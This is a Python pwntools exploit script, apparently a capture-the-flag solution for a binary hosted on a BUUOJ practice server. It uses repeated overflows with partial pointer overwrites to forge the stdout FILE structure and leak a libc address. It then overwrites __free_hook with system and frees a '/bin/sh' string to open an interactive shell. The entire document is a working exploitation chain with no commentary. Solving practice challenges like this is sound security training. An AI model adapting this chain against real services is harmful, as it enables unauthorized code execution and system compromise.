from pwn import *
context.log_level='debug'
libc=ELF('./libc.so.6')
# libc=ELF('/home/nova/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')
offset=0x7f93d50c0980-0x7f93d4ed4000
p=process('./pwn')
p=connect('node4.buuoj.cn',28076)
p.sendafter(b'>>',b'a'*0x80+b'\x60')
p.sendlineafter(b'>>',b'\x68')

p.sendafter(b'>>',b'a'*0x80+b'\x60')
p.sendlineafter(b'>>',p32(5))

p.sendafter(b'>>',b'a'*0x80+b'\x80')
p.sendlineafter(b'>>',p64(0xfbad1800)+p64(0x0)*3+b'\x00')
libc.address=u64(p.recvuntil(b'\x7f')[-6:]+b'\0\0')-offset
info(hex(libc.address))

p.sendafter(b'>>',b'a'*0x80+b'\x60')
p.sendlineafter(b'>>',p32(5))

p.sendafter(b'>>',b'a'*0x80+b'\xc8')
p.sendlineafter(b'>>',b'/bin/sh\x00')

p.sendafter(b'>>',b'a'*0x80+b'\x60')
p.sendlineafter(b'>>',p32(3)+p32(0)+p64(libc.sym['__free_hook']))

p.sendafter(b'>>',b'a'*0x80+b'\x70')
p.sendlineafter(b'>>',p64(libc.sym['system']))

p.interactive()